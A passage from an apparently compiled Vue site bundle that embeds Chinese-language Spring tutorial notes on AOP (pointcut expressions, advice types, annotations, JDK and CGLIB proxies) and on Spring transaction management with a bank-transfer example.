：连接单个切入点表达式，表示该切入点表达式不成立的匹配\n\n#### 3.4.4)切入点表达式——范例\n\n```java\nexecution(* *(..))\nexecution(* *..*(..))\nexecution(* *..*.*(..))\nexecution(public * *..*.*(..))\nexecution(public int *..*.*(..))\nexecution(public void *..*.*(..))\nexecution(public void com..*.*(..)) \nexecution(public void com..service.*.*(..))\nexecution(public void com.itheima.service.*.*(..))\nexecution(public void com.itheima.service.User*.*(..))\nexecution(public void com.itheima.service.*Service.*(..))\nexecution(public void com.itheima.service.UserService.*(..))\nexecution(public User com.itheima.service.UserService.find*(..))\nexecution(public User com.itheima.service.UserService.*Id(..))\nexecution(public User com.itheima.service.UserService.findById(..))\nexecution(public User com.itheima.service.UserService.findById(int))\nexecution(public User com.itheima.service.UserService.findById(int,int))\nexecution(public User com.itheima.service.UserService.findById(int,*))\nexecution(public User com.itheima.service.UserService.findById(*,int))\nexecution(public User com.itheima.service.UserService.findById())\nexecution(List com.itheima.service.*Service+.findAll(..))\n```\n\n### **3.5)切入点的三种配置方式**\n\n```xml\n<aop:config>\n    \x3c!--配置公共切入点--\x3e\n    <aop:pointcut id="pt1" expression="execution(* *(..))"/>\n    <aop:aspect ref="myAdvice">\n        \x3c!--配置局部切入点--\x3e\n        <aop:pointcut id="pt2" expression="execution(* *(..))"/>\n        \x3c!--引用公共切入点--\x3e\n        <aop:before method="logAdvice" pointcut-ref="pt1"/>\n        \x3c!--引用局部切入点--\x3e\n        <aop:before method="logAdvice" pointcut-ref="pt2"/>\n        \x3c!--直接配置切入点--\x3e\n        <aop:before method="logAdvice" pointcut="execution(* *(..))"/>\n    </aop:aspect>\n</aop:config>\n```\n\n### **3.6)切入点配置经验**\n\n- 企业开发命名规范严格遵循规范文档进行\n\n- 先为方法配置局部切入点\n\n- 再抽取类中公共切入点\n\n- 最后抽取全局切入点\n\n- 代码走查过程中检测切入点是否存在越界性包含\n\n- 代码走查过程中检测切入点是否存在非包含性进驻\n\n- 设定AOP执行检测程序，在单元测试中监控通知被执行次数与预计次数是否匹配\n\n- 设定完毕的切入点如果发生调整务必进行回归测试\n\n（以上规则适用于XML配置格式）\n\n### **3.7)通知类型**\n\nAOP的通知类型共5种\n\n- 前置通知：原始方法执行前执行，如果通知中抛出异常，阻止原始方法运行\n\n  应用：数据校验\n\n- 后置通知：原始方法执行后执行，无论原始方法中是否出现异常，都将执行通知\n\n    应用：现场清理\n\n- 返回后通知：原始方法正常执行完毕并返回结果后执行，如果原始方法中抛出异常，无法执行\n\n    应用：返回值相关数据处理\n\n- 抛出异常后通知：原始方法抛出异常后执行，如果原始方法没有抛出异常，无法执行\n\n    应用：对原始方法中出现的异常信息进行处理\n\n- 环绕通知：在原始方法执行前后均有对应执行执行，还可以阻止原始方法的执行\n\n    应用：十分强大，可以做任何事情\n\n#### 3.7.1)aop:before\n\n- 名称：aop:before\n\n- 类型：**标签**\n\n- 归属：aop:aspect标签\n\n- 作用：设置前置通知\n\n- 格式：\n\n  ```xml\n  <aop:aspect ref="adviceId">\n      <aop:before method="methodName" pointcut="……"/>\n  </aop:aspect>\n  ```\n\n-  说明：一个aop:aspect标签中可以配置多个aop:before标签\n\n- 基本属性：\n\n  - method ：在通知类中设置当前通知类别对应的方法\n\n  - pointcut ：设置当前通知对应的切入点表达式，与pointcut-ref属性冲突\n\n  - pointcut-ref ：设置当前通知对应的切入点id，与pointcut属性冲突\n\n#### 3.7.2)aop:after\n\n- 名称：aop:after\n\n- 类型：**标签**\n\n- 归属：aop:aspect标签\n\n- 作用：设置后置通知\n\n- 格式：\n\n  ```xml\n  <aop:aspect ref="adviceId">\n      <aop:after method="methodName" pointcut="……"/>\n  </aop:aspect>\n  ```\n\n-  说明：一个aop:aspect标签中可以配置多个aop:after标签\n\n- 基本属性：\n\n  - method ：在通知类中设置当前通知类别对应的方法\n\n  - pointcut ：设置当前通知对应的切入点表达式，与pointcut-ref属性冲突\n\n  - pointcut-ref ：设置当前通知对应的切入点id，与pointcut属性冲突\n\n#### 3.7.3)aop:after-returning\n\n- 名称：aop:after-returning\n\n- 类型：**标签**\n\n- 归属：aop:aspect标签\n\n- 作用：设置返回后通知\n\n- 格式：\n\n  ```xml\n  <aop:aspect ref="adviceId">\n      <aop:after-returning method="methodName" pointcut="……"/>\n  </aop:aspect>\n  ```\n\n-  说明：一个aop:aspect标签中可以配置多个aop:after-returning标签\n\n- 基本属性：\n\n  - method ：在通知类中设置当前通知类别对应的方法\n\n  - pointcut ：设置当前通知对应的切入点表达式，与pointcut-ref属性冲突\n\n  - pointcut-ref ：设置当前通知对应的切入点id，与pointcut属性冲突\n\n#### 3.7.4)aop:after-throwing\n\n- 名称：aop:after-throwing\n\n- 类型：**标签**\n\n- 归属：aop:aspect标签\n\n- 作用：设置抛出异常后通知\n\n- 格式：\n\n  ```xml\n  <aop:aspect ref="adviceId">\n      <aop:after-throwing method="methodName" pointcut="……"/>\n  </aop:aspect>\n  ```\n\n-  说明：一个aop:aspect标签中可以配置多个aop:after-throwing标签\n\n- 基本属性：\n\n  - method ：在通知类中设置当前通知类别对应的方法\n\n  - pointcut ：设置当前通知对应的切入点表达式，与pointcut-ref属性冲突\n\n  - pointcut-ref ：设置当前通知对应的切入点id，与pointcut属性冲突\n\n#### 3.7.5)aop:around\n\n- 名称：aop:around\n\n- 类型：**标签**\n\n- 归属：aop:aspect标签\n\n- 作用：设置环绕通知\n\n- 格式：\n\n  ```xml\n  <aop:aspect ref="adviceId">\n      <aop:around method="methodName" pointcut="……"/>\n  </aop:aspect>\n  ```\n\n-  说明：一个aop:aspect标签中可以配置多个aop:around标签\n\n- 基本属性：\n\n  - method ：在通知类中设置当前通知类别对应的方法\n\n  - pointcut ：设置当前通知对应的切入点表达式，与pointcut-ref属性冲突\n\n  - pointcut-ref ：设置当前通知对应的切入点id，与pointcut属性冲突\n\n环绕通知的开发方式\n\n- 环绕通知是在原始方法的前后添加功能，在环绕通知中，存在对原始方法的显式调用\n\n  ```java\n  public Object around(ProceedingJoinPoint pjp) throws Throwable {\n      Object ret = pjp.proceed();\n      return ret;\n  }\n  ```\n\n- 环绕通知方法相关说明：\n\n  - 方法须设定Object类型的返回值，否则会拦截原始方法的返回。如果原始方法返回值类型为void，通知方\t也可以设定返回值类型为void，最终返回null\n\n  - 方法需在第一个参数位置设定ProceedingJoinPoint对象，通过该对象调用proceed()方法，实现对原始方法的调用。如省略该参数，原始方法将无法执行\n\n  - 使用proceed()方法调用原始方法时，因无法预知原始方法运行过程中是否会出现异常，强制抛出Throwable对象，封装原始方法中可能出现的异常信息\n\n### **3.8)通知顺序（了解）**\n\n当同一个切入点配置了多个通知时，通知会存在运行的先后顺序，该顺序以通知配置的顺序为准\n\n### **3.9)通知获取数据**\n\n- 参数\n\n- 返回值\n\n- 异常\n\n#### **3.9.1)通知获取参数数据**\n\n第一种情况：\n\n- 设定通知方法第一个参数为JoinPoint，通过该对象调用getArgs()方法，获取原始方法运行的参数数组\n\n  ```java\n  public void before(JoinPoint jp) throws Throwable {\n      Object[] args = jp.getArgs();\n  }\n  ```\n\n- 所有的通知均可以获取参数\n\n第二种情况：\n\n- 设定切入点表达式为通知方法传递参数（锁定通知变量名）\n\n- 原始方法\n\n![1591284387913](./img/java/springmvc/Spring-day03/1591284387913.png)\n\n第三种情况\n\n- 设定切入点表达式为通知方法传递参数（改变通知变量名的定义顺序）\n\n- 原始方法\n\n![1591284429541](./img/java/springmvc/Spring-day03/1591284429541.png)\n\n#### **3.9.2)通知获取返回值数据**\n\n第一种：返回值变量名\n\n- 设定返回值变量名\n\n- 原始方法\n\n  ```java\n  public int save() {\n  \tSystem.out.println("user service running...");\n      return 100;\n  }\n  ```\n\n-  AOP配置\n\n  ```xml\n  <aop:aspect ref="myAdvice">\n      <aop:pointcut id="pt3" expression="execution(* *(..))  "/>\n      <aop:after-returning method="afterReturning" pointcut-ref="pt3" returning="ret"/>\n  </aop:aspect>\n  ```\n\n- 通知类\n\n  ```java\n  public void afterReturning(Object ret) {\n      System.out.println(ret);\n  }\n  ```\n\n- 适用于返回后通知（after-returning）\n\n第二种：\n\n- 在通知类的方法中调用原始方法获取返回值\n\n- 原始方法\n\n  ```java\n  public int save() {\n      System.out.println("user service running...");\n      return 100;\n  }\n  ```\n\n- AOP配置l\n\n  ```xml\n  <aop:aspect ref="myAdvice">\n      <aop:pointcut id="pt2" expression="execution(* *(..))  "/>\n      <aop:around method="around" pointcut-ref="pt2" />\n  </aop:aspect>\n  ```\n\n- 通知类\n\n  ```java\n  public Object around(ProceedingJoinPoint pjp) throws Throwable {\n      Object ret = pjp.proceed();\n      return ret;\n  }\n  ```\n\n- 适用于环绕通知（around）\n\n#### **3.9.3)通知获取异常数据**\n\n第一种：通知类的方法中调用原始方法捕获异常\n\n- 在通知类的方法中调用原始方法捕获异常\n\n- 原始方法\n\n  ```java\n  public void save() {\n      System.out.println("user service running...");\n      int i = 1/0;\n  }\n  ```\n\n-  AOP配置\n\n  ```xml\n  <aop:aspect ref="myAdvice">\n      <aop:pointcut id="pt4" expression="execution(* *(..))  "/>\n      <aop:around method="around" pointcut-ref="pt4" />\n  </aop:aspect>\n  ```\n\n- 通知类\n\n  ```java\n  public Object around(ProceedingJoinPoint pjp) throws Throwable {\n      Object ret = pjp.proceed();\t//对此处调用进行try……catch……捕获异常，或抛出异常\n      return ret;\n  }\n  ```\n\n- 适用于环绕通知（around）\n\n第二种：\n\n- 设定异常对象变量名\n\n- 原始方法\n\n  ```java\n  public void save() {\n      System.out.println("user service running...");\n      int i = 1/0;\n  }\n  ```\n\n-  AOP配置\n\n  ```xml\n  <aop:aspect ref="myAdvice">\n  \t<aop:pointcut id="pt4" expression="execution(* *(..))  "/>\n      <aop:after-throwing method="afterThrowing" pointcut-ref="pt4" throwing="t"/>\n  </aop:aspect>\n  ```\n\n- 通知类\n\n  ```java\n  public void afterThrowing(Throwable t){\n      System.out.println(t.getMessage());\n  }\n  ```\n\n- 适用于返回后通知（after-throwing）\n\n## 4)AOP配置（注解）\n\n### 4.1)AOP配置\n\n![1591285050618](./img/java/springmvc/Spring-day03/1591285050618.png)\n\n### 4.2)注解开发AOP制作步骤\n\n在XML格式基础上\n\n- 导入坐标（伴随spring-context坐标导入已经依赖导入完成）\n\n- 开启AOP注解支持\n\n- 配置切面@Aspect\n\n- 定义专用的切入点方法，并配置切入点@Pointcut\n\n- 为通知方法配置通知类型及对应切入点@Before\n\n### 4.3)注解开发AOP注意事项\n\n1.切入点最终体现为一个方法，无参无返回值，无实际方法体内容，但不能是抽象方法\n\n2.引用切入点时必须使用方法调用名称，方法后面的（）不能省略\n\n3.切面类中定义的切入点只能在当前类中使用，如果想引用其他类中定义的切入点使用“类名.方法名()”引用\n\n4.可以在通知类型注解后添加参数，实现XML配置中的属性，例如after-returning后的returning属性\n\n![1591285152119](./img/java/springmvc/Spring-day03/1591285152119.png)\n\n### 4.4)AOP注解详解\n\n#### 4.4.1)@Aspect\n\n- 名称：@Aspect\n\n- 类型：**注解**\n\n- 位置：类定义上方\n\n- 作用：设置当前类为切面类\n\n- 格式：\n\n  ```java\n  @Aspect\n  public class AopAdvice {\n  }\n  ```\n\n- 说明：一个beans标签中可以配置多个aop:config标签\n\n#### 4.4.2)@Pointcut\n\n- 名称：@Pointcut\n\n- 类型：**注解**\n\n- 位置：方法定义上方\n\n- 作用：使用当前方法名作为切入点引用名称\n\n- 格式：\n\n  ```java\n  @Pointcut("execution(* *(..))")\n  public void pt() {\n  }\n  ```\n\n- 说明：被修饰的方法忽略其业务功能，格式设定为无参无返回值的方法，方法体内空实现（非抽象）\n\n#### 4.4.3)@Before\n\n- 名称：@Before\n\n- 类型：**注解**\n\n- 位置：方法定义上方\n\n- 作用：标注当前方法作为前置通知\n\n- 格式：\n\n  ```java\n  @Before("pt()")\n  public void before(){\n  }\n  ```\n\n- 特殊参数：\n\n  - 无\n\n#### 4.4.4)@After\n\n- 名称：@After\n\n- 类型：**注解**\n\n- 位置：方法定义上方\n\n- 作用：标注当前方法作为后置通知\n\n- 格式：\n\n  ```java\n  @After("pt()")\n  public void after(){\n  }\n  ```\n\n- 特殊参数：\n\n  - 无\n\n#### 4.4.5)@AfterReturning\n\n- 名称：@AfterReturning\n\n- 类型：**注解**\n\n- 位置：方法定义上方\n\n- 作用：标注当前方法作为返回后通知\n\n- 格式：\n\n  ```java\n  @AfterReturning(value="pt()",returning = "ret")\n  public void afterReturning(Object ret) {\n  }\n  ```\n\n- 特殊参数：\n\n  - returning ：设定使用通知方法参数接收返回值的变量名\n\n#### 4.4.6)@AfterThrowing\n\n- 名称：@AfterThrowing\n\n- 类型：**注解**\n\n- 位置：方法定义上方\n\n- 作用：标注当前方法作为异常后通知\n\n- 格式：\n\n  ```java\n  @AfterThrowing(value="pt()",throwing = "t")\n  public void afterThrowing(Throwable t){\n  }\n  ```\n\n- 特殊参数：\n\n  - throwing ：设定使用通知方法参数接收原始方法中抛出的异常对象名\n\n#### 4.4.7)@Around\n\n- 名称：@Around\n\n- 类型：**注解**\n\n- 位置：方法定义上方\n\n- 作用：标注当前方法作为环绕通知\n\n- 格式：\n\n  ```java\n  @Around("pt()")\n  public Object around(ProceedingJoinPoint pjp) throws Throwable {\n      Object ret = pjp.proceed();\n      return ret;\n  }\n  ```\n\n- 特殊参数：\n\n  - 无\n\n### 4.5)AOP注解开发通知执行顺序控制（了解）\n\n1.AOP使用XML配置情况下，通知的执行顺序由配置顺序决定，在注解情况下由于不存在配置顺序的概念的概念，参照通知所配置的方法名字符串对应的编码值顺序，可以简单理解为字母排序\n\n- 同一个通知类中，相同通知类型以方法名排序为准\n\n- 不同通知类中，以类名排序为准\n\n- 使用@Order注解通过变更bean的加载顺序改变通知的加载顺序\n\n2.企业开发经验\n\n- 通知方法名由3部分组成，分别是前缀、顺序编码、功能描述\n\n- 前缀为固定字符串，例如baidu、itheima等，无实际意义\n\n- 顺序编码为6位以内的整数，通常3位即可，不足位补0\n\n- 功能描述为该方法对应的实际通知功能，例如exception、strLenCheck\n\n  - 制通知执行顺序使用顺序编码控制，使用时做一定空间预留\n\n  - 003使用，006使用，预留001、002、004、005、007、008\n\n  - 使用时从中段开始使用，方便后期做前置追加或后置追加\n\n  - 最终顺序以运行顺序为准，以测试结果为准，不以设定规则为准\n\n### 4.6)AOP注解驱动\n\n- 名称：@EnableAspectJAutoProxy\n\n- 类型：**注解**\n\n- 位置：Spring注解配置类定义上方\n\n- 作用：设置当前类开启AOP注解驱动的支持，加载AOP注解\n\n- 格式：\n\n  ```java\n  @Configuration\n  @ComponentScan("com.itheima")\n  @EnableAspectJAutoProxy\n  public class SpringConfig {\n  }\n  ```\n\n## 5)综合案例\n\n### **5.1)案例介绍**\n\n对项目进行业务层接口执行监控，测量业务层接口的执行效率\n\n```java\npublic interface AccountService {\n    void save(Account account);\n    void delete(Integer id);\n    void update(Account account);\n    List<Account> findAll();\n    Account findById(Integer id);\n}\n```\n\n### **5.2)案例分析**\n\n- 测量接口执行效率：接口方法执行前后获取执行时间，求出执行时长\n  - System.currentTimeMillis( )\n\n- 对项目进行监控：项目中所有接口方法，AOP思想，执行期动态织入代码\n\n  - 环绕通知\n\n  - proceed()方法执行前后获取系统时间\n\n### **5.3)案例制作步骤**\n\n- 定义切入点（务必要绑定到接口上，而不是接口实现类上）\n\n- 制作AOP环绕通知，完成测量功能\n\n- 注解配置AOP\n\n- 开启注解驱动支持\n\n### **5.4)案例制作核心代码**\n\n```java\npublic class RunTimeMonitorAdvice {\n    //拦截所有的业务层接口中查询操作的执行\n    @Pointcut("execution(* com.itheima.service.*Service.find*(..))")\n    public void pt(){}\n    @Around("pt()")\n    public Object runtimeMonitor(ProceedingJoinPoint pjp) throws Throwable {\n        //获取执行签名信息\n        Signature signature = pjp.getSignature();\n        //通过签名获取执行类型（接口名）\n        String targetClass = signature.getDeclaringTypeName();\n        //通过签名获取执行操作名称（方法名）\n        String targetMethod = signature.getName();\n        //获取操作前系统时间beginTime\n        long beginTime = System.currentTimeMillis();\n        Object ret = pjp.proceed(pjp.getArgs());\n        //获取操作后系统时间endTime\n        long endTime = System.currentTimeMillis();\n        System.out.println(targetClass+" 中 "+targetMethod+" 运行时长 "+(endTime-beginTime)+"ms");\n        return ret;\n    }\n}\n```\n\n### **5.5)案例后续思考与设计**\n\n- 测量真实性\n\n  - 开发测量是隔离性反复执行某个操作，是理想情况，上线测量差异过大\n\n  - 上线测量服务器性能略低于单机开发测量\n\n  - 上线测量基于缓存的性能查询要优于数据库查询测量\n\n  - 上线测量接口的性能与最终对外提供的服务性能差异过大\n\n  - 当外部条件发生变化（硬件），需要进行回归测试，例如数据库迁移\n\n- 测量结果展示\n\n  - 测量结果无需每一个都展示，需要设定检测阈值\n\n  - 阈值设定要根据业务进行区分，一个复杂的查询与简单的查询差异化很大\n\n  - 阈值设定需要做独立的配置文件或通过图形工具配置（工具级别的开发）\n\n  - 配合图形界面展示测量结果\n\n\n\n## 6)AOP底层原理\n\n- 静态代理\n\n- 动态代理——Proxy\n\n- 动态代理——CGLIB\n\n- 织入形式\n\n### **6.1)静态代理**\n\n装饰者模式（Decorator Pattern）：在不惊动原始设计的基础上，为其添加功能\n\n![1591287238806](./img/java/springmvc/Spring-day03/1591287238806.png)\n\n```java\npublic class UserServiceDecorator implements UserService{\n    private UserService userService;\n    public UserServiceDecorator(UserService userService) {\n        this.userService = userService;\n    }\n    public void save() {\n        //原始调用\n        userService.save();\n        //增强功能（后置）\n        System.out.println("刮大白");\n    }\n}\n```\n\n### 6.2)动态代理——JDK Proxy\n\nJDKProxy动态代理是针对对象做代理，要求原始对象具有接口实现，并对接口方法进行增强\n\n```java\npublic class UserServiceJDKProxy {\n    public UserService createUserServiceJDKProxy(final UserService userService){\n        //获取被代理对象的类加载器\n        ClassLoader classLoader = userService.getClass().getClassLoader();\n        //获取被代理对象实现的接口\n        Class[] classes = userService.getClass().getInterfaces();\n        //对原始方法执行进行拦截并增强\n        InvocationHandler ih = new InvocationHandler() {\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                //前置增强内容\n                Object ret = method.invoke(userService, args);\n                //后置增强内容\n                System.out.println("刮大白2");\n                return ret;\n            }\n        };\n        //使用原始被代理对象创建新的代理对象\n        UserService proxy = (UserService) Proxy.newProxyInstance(classLoader,classes,ih);\n        return proxy;\n    }\n}\n```\n\n### 6.3)动态代理——CGLIB\n\n- CGLIB(Code Generation Library)，Code生成类库\n\n- CGLIB动态代理不限定是否具有接口，可以对任意操作进行增强\n\n- CGLIB动态代理无需要原始被代理对象，动态创建出新的代理对象\n\n![1591287441096](./img/java/springmvc/Spring-day03/1591287441096.png)\n\n```java\npublic class UserServiceImplCglibProxy {\n    public static UserServiceImpl createUserServiceCglibProxy(Class clazz){\n        //创建Enhancer对象（可以理解为内存中动态创建了一个类的字节码）\n        Enhancer enhancer = new Enhancer();\n        //设置Enhancer对象的父类是指定类型UserServerImpl\n        enhancer.setSuperclass(clazz);\n        Callback cb = new MethodInterceptor() {\n            public Object intercept(Object o, Method m, Object[] a, MethodProxy mp) throws Throwable {\n                Object ret = mp.invokeSuper(o, a);\n                if(m.getName().equals("save")) {\n                    System.out.println("刮大白");\n                }\n                return ret;\n            }\n        };\n        //设置回调方法\n        enhancer.setCallback(cb);\n        //使用Enhancer对象创建对应的对象\n        return (UserServiceImpl)enhancer.create();\n    }\n}\n```\n\n### **6.4)代理模式的选择**\n\nSpirng可以通过配置的形式控制使用的代理形式，默认使用jdkproxy，通过配置可以修改为使用cglib\n\n- XML配置\n\n  ```xml\n  \x3c!--XMP配置AOP--\x3e\n  <aop:config proxy-target-class="false">\v</aop:config>\n  ```\n\n- XML注解支持\n\n  ```xml\n  \x3c!--注解配置AOP--\x3e\n  <aop:aspectj-autoproxy proxy-target-class="false"/>\n  ```\n\n- 注解驱动\n\n  ```java\n  //注解驱动\n  @EnableAspectJAutoProxy(proxyTargetClass = true)\n  ```\n\n### **6.5)织入时机**\n\n![1591287839941](./img/java/springmvc/Spring-day03/1591287839941.png)',Pe={data:function(){return{MainComponent:De}}},Ne=Pe,qe=Object(u["a"])(Ne,Ae,Ie,!1,null,"b14069ae",null),He=qe.exports,Be=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Fe=[],Ue='# spring 事务\n\n## 1)事务回顾\n\n### 1.1)什么是事务？\n\n事务指数据库中多个操作合并在一起形成的操作序列\n\n### 1.2)事务的作用\n\n1.当数据库操作序列中个别操作失败时，提供一种方式使数据库状态恢复到正常状态（**A**），保障数据库即使在异常状态下仍能保持数据一致性（**C**）（要么操作前状态，要么操作后状态）。\n\n2.当出现并发访问数据库时，在多个访问间进行相互隔离，防止并发访问操作结果互相干扰（**I**）。\n\n- 事务特征（ACID）\n\n  - 原子性（Atomicity）指事务是一个不可分割的整体，其中的操作要么全执行或全不执行\n\n  - 一致性（Consistency）事务前后数据的完整性必须保持一致\n\n  - 隔离性（Isolation）事务的隔离性是多个用户并发访问数据库时，数据库为每一个用户开启的事务，不能被其他事务的操作数据所干扰，多个并发事务之间要相互隔离\n\n  - 持久性（Durability）持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来即使数据库发生故障也不应该对其有任何影响\n\n### 1.3)事务的隔离级\n\n- 脏读：允许读取未提交的信息\n\n  - 原因：Read uncommitted\n\n  解决方案： （表级读锁）\n\n![1591321851725](./img/java/springmvc/Spring-day04/1591321851725.png)\n\n- 不可重复读：读取过程中单个数据发生了变化\n  - 解决方案： Repeatable read （行级写锁）\n\n![1591321927034](./img/java/springmvc/Spring-day04/1591321927034.png)\n\n- 幻读：读取过程中数据条目发生了变化\n  - 解决方案： Serializable（表级写锁）\n\n![1591321959641](./img/java/springmvc/Spring-day04/1591321959641.png)\n\n\n\n## 2)事务管理\n\n### 2.1)**Spring**事务核心对象\n\n- J2EE开发使用分层设计的思想进行，对于简单的业务层转调数据层的单一操作，事务开启在业务层或者数据层并无太大差别，当业务中包含多个数据层的调用时，需要在业务层开启事务，对数据层中多个操作进行组合并归属于同一个事务进行处理\n\n- Spring为业务层提供了整套的事务解决方案\n\n  - PlatformTransactionManager\n  - TransactionDefinition\n\n  - TransactionStatus\n\n### **2.2)PlatformTransactionManager**\n\n- 平台事务管理器实现类\n\n  - DataSourceTransactionManager  适用于Spring JDBC或MyBatis\n\n  - HibernateTransactionManager  适用于Hibernate3.0及以上版本\n\n  - JpaTransactionManager  适用于JPA\n\n  - JdoTransactionManager  适用于JDO\n\n  - JtaTransactionManager  适用于JTA\n\n\n\n- JPA（Java Persistence API）Java EE 标准之一，为POJO提供持久化标准规范，并规范了持久化开发的统一API，符合JPA规范的开发可以在不同的JPA框架下运行\n\n- JDO(Java Data Object )是Java对象持久化规范，用于存取某种数据库中的对象，并提供标准化API。与JDBC相比，JDBC仅针对关系数据库进行操作，JDO可以扩展到关系数据库、文件、XML、对象数据库（ODBMS）等，可移植性更强\n\n- JTA（Java Transaction API）Java EE 标准之一，允许应用程序执行分布式事务处理。与JDBC相比，JDBC事务则被限定在一个单一的数据库连接，而一个JTA事务可以有多个参与者，比如JDBC连接、JDO 都可以参与到一个JTA事务中\n\n此接口定义了事务的基本操作\n\n- 获取事务 ：\n\n  ```java\n  TransactionStatus getTransaction(TransactionDefinition definition)\n  ```\n\n- 提交事务 ：\n\n  ```java\n  void commit(TransactionStatus status) \n  ```\n\n- 回滚事务 ：\n\n  ```java\n  void rollback(TransactionStatus status)\n  ```\n\n### **2.3)TransactionDefinition**\n\n此接口定义了事务的基本信息\n\n- 获取事务定义名称\n\n  ```java\n  String getName()\n  ```\n\n- 获取事务的读写属性\n\n  ```java\n  boolean isReadOnly()\n  ```\n\n- 获取事务隔离级别\n\n  ```java\n  int getIsolationLevel()\n  ```\n\n- 获事务超时时间\n\n  ```java\n  int getTimeout()\n  ```\n\n- 获取事务传播行为特征\n\n  ```java\n  int getPropagationBehavior()\n  ```\n\n### **2.4)TransactionStatus**\n\n此接口定义了事务在执行过程中某个时间点上的状态信息及对应的状态操作\n\n![1591322466820](./img/java/springmvc/Spring-day04/1591322466820.png)\n\n### **2.5)事务控制方式**\n\n- 编程式\n\n- 声明式（XML）\n\n- 声明式（注解）\n\n### **2.6)案例说明**\n\n#### 2.6.1)案例说明\n\n银行转账业务说明\n\n银行转账操作中，涉及从A账户到B账户的资金转移操作。数据层仅提供单条数据的基础操作，未设计多账户间的业务操作。\n\n#### 2.6.2)案例环境（基于Spring、Mybatis整合）\n\n- 业务层接口提供转账操作\n\n```java\n/**\n* 转账操作\n* @param outName     出账用户名\n* @param inName      入账用户名\n* @param money       转账金额\n*/\npublic void transfer(String outName,String inName,Double money);\n```\n\n- 业务层实现提供转账操作\n\n```java\npublic void transfer(String outName,String inName,Double money){\n    accountDao.inMoney(outName,money);                                                       accountDao.outMoney(inName,money);\n}\n```\n\n- 数据层提供对应的入账与出账操作\n\n```xml\n<update id="inMoney">\n\tupdate account set money = money + #{money} where name = #{name}\n</update>\n<update id="outMoney">\n\tupdate account set money = money - #{money} where name = #{name}\n</update>\n```\n\n#### **2.6.3)编程式事务**\n\n```java\npublic void transfer(String outName,String inName,Double money){\n    //创建事务管理器\n    DataSourceTransactionManager dstm = new DataSourceTransactionManager();\n    //为事务管理器设置与数据层相同的数据源\n    dstm.setDataSource(dataSource);\n    //创建事务定义对象\n    TransactionDefinition td = new DefaultTransactionDefinition();\n    //创建事务状态对象，用于控制事务执行\n    TransactionStatus ts = dstm.getTransaction(td);\n    accountDao.inMoney(outName,money);\n    int i = 1/0;    //模拟业务层事务过程中出现错误\n    accountDao.outMoney(inName,money);\n    //提交事务\n    dstm.commit(ts);\n}\n```\n\n### 2.7)使用AOP控制事务\n\n将业务层的事务处理功能抽取出来制作成AOP通知，利用环绕通知运行期动态织入\n\n```java\npublic Object tx(ProceedingJoinPoint pjp) throws Throwable {\n    \n    DataSourceTransactionManager dstm = new DataSourceTransactionManager();\n    dstm.setDataSource(dataSource);\n    TransactionDefinition td = new DefaultTransactionDefinition();\n    TransactionStatus ts = dstm.getTransaction(td);\n    Object ret = pjp.proceed(pjp.getArgs());\n    dstm.commit(ts);\n    \n    return ret;\n}\n```\n\n配置AOP通知类，并注入dataSource\n\n```xml\n<bean id="txAdvice" class="com.itheima.aop.TxAdvice">\n    <property name="dataSource" ref="dataSource"/>\n</bean>\n```\n\n使用环绕通知将通知类织入到原始业务对象执行过程中\n\n```xml\n<aop:config>\n    <aop:pointcut id="pt" expression="execution(* *..transfer(..))"/>\n    <aop:aspect ref="txAdvice">\n        <aop:around method="tx" pointcut-ref="pt"/>\n    </aop:aspect>\n</aop:config>\n```\n\n### **2.8声明式事务（XML）**\n\n**AOP**配置事务是否具有特例性？\n\n```java\npublic Object tx(ProceedingJoinPoint pjp) throws Throwable {\n    DataSourceTransactionManager dstm = new DataSourceTransactionManager();\n    dstm.setDataSource(dataSource);\n    TransactionDefinition td = new DefaultTransactionDefinition();\n    TransactionStatus ts = dstm.getTransaction(td);\n    Object ret = pjp.proceed(pjp.getArgs());\n    dstm.commit(ts);\n\n    return ret;\n}\n```\n\n```xml\n<bean id="txAdvice" class="com.itheima.aop.TxAdvice">\n\t<property name="dataSource" ref="dataSource"/>\n</bean>\n```\n\n使用tx命名空间配置事务专属通知类\n\n```xml\n<tx:advice id="txAdvice" transaction-manager="txManager">\n    <tx:attributes>\n        <tx:method name="*" read-only="false" />\n        <tx:method name="get*" read-only="true" />\n        <tx:method name="find*" read-only="true" />\n    </tx:attributes>\n</tx:advice>\n```\n\n使用aop:advisor在AOP配置中引用事务专属通知类\n\n```xml\n<aop:config>\n    <aop:pointcut id="pt" expression="execution(* *..*(..))"/>\n    <aop:advisor advice-ref="txAdvice" pointcut-ref="pt"/>\n</aop:config>\n```\n\n#### 2.8.1)**aop:advice与aop:advisor区别**\n\n- aop:advice配置的通知类可以是普通java对象，不实现接口，也不使用继承关系\n\n- aop:advisor配置的通知类必须实现通知接口\n\n  - MethodBeforeAdvice\n\n  - AfterReturningAdvice\n\n  - ThrowsAdvice\n\n  - ……\n\n#### 2.8.2)tx配置----tx:advice\n\n- 名称：tx:advice\n\n- 类型：**标签**\n\n- 归属：beans标签\n\n- 作用：专用于声明事务通知\n\n- 格式：\n\n  ```xml\n  <beans>\n      <tx:advice id="txAdvice" transaction-manager="txManager">\n      </tx:advice>\n  </beans>\n  ```\n\n- 基本属性：\n\n  - id ：用于配置aop时指定通知器的id\n\n  - transaction-manager ：指定事务管理器bean\n\n#### 2.8.3)tx配置----tx:attributes\n\n- 名称：tx:attributes\n\n- 类型：**标签**\n\n- 归属：tx:advice标签\n\n- 作用：定义通知属性\n\n- 格式：\n\n  ```xml\n  <tx:advice id="txAdvice" transaction-manager="txManager">\n      <tx:attributes>\n      </tx:attributes>\n  </tx:advice>\n  ```\n\n- 基本属性：\n\n  - 无\n\n#### 2.8.4)tx配置----tx:method\n\n- 名称：tx:method\n\n- 类型：**标签**\n\n- 归属：tx:attribute标签\n\n- 作用：设置具体的事务属性\n\n- 格式：\n\n  ```xml\n  <tx:attributes>\n      <tx:method name="*" read-only="false" />\n      <tx:method name="get*" read-only="true" />\n  </tx:attributes>\n  ```\n\n- 说明：\n\n  通常事务属性会配置多个，包含1个读写的全事务属性，1个只读的查询类事务属性\n\n**tx:method属性**\n\n![1591367291135](./img/java/springmvc/Spring-day04/1591367291135.png)\n\n### **2.9)事务传播行为**\n\n- 事务管理员\n\n- 事务协调员\n\n![1591367347482](./img/java/springmvc/Spring-day04/1591367347482.png)\n\n- 事务传播行为描述的是事务协调员对事务管理员所携带事务的处理态度\n\n### 